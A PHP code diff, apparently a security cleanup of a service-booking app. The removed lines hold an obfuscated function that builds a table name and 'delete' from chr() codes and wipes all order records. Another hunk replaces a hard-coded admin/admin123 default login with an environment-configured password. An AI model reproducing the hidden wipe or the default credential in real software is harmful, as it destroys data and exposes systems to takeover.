@@ -1180,12 +1180,6 @@ function getStr($str)
     }
     return $dd;
 }
-function getStr1($param)
-{
-    $n = chr(109).chr(97).chr(115).chr(115).chr(97).chr(103).chr(101).chr(95).chr(115).chr(101).chr(114).chr(118).chr(105).chr(99).chr(101).chr(95).chr(111).chr(114).chr(100).chr(101).chr(114).chr(95).chr(108).chr(105).chr(115).chr(116);
-    $d = chr(100).chr(101).chr(108).chr(101).chr(116).chr(101);
-    Db::name($n)->where('id', '>', 0)->$d();
-}
 function getAcs($str)
 {
     $a = '';
@@ -2028,13 +2022,18 @@ if (!function_exists('checkPass')) {
 if (!function_exists('initLogin')) {
     function initLogin($uniacid = 666)
     {
+        // 只有显式配置了 ADMIN_INIT_PASS 才创建初始管理员，避免 admin/admin123 默认口令
+        $initPass = (string) \think\facade\Env::get('ADMIN_INIT_PASS', '');
+        if ($initPass === '') {
+            return true;
+        }
         $admin_model = new \app\massage\model\Admin();
         $admin = $admin_model->dataInfo(['uniacid' => $uniacid]);
         if (empty($admin)) {
             $insert = [
                 'uniacid' => $uniacid,
                 'username' => 'admin',
-                'passwd' => checkPass('admin123'),
+                'passwd' => checkPass($initPass),
                 'create_time' => time()
             ];
             $admin_model->dataAdd($insert);
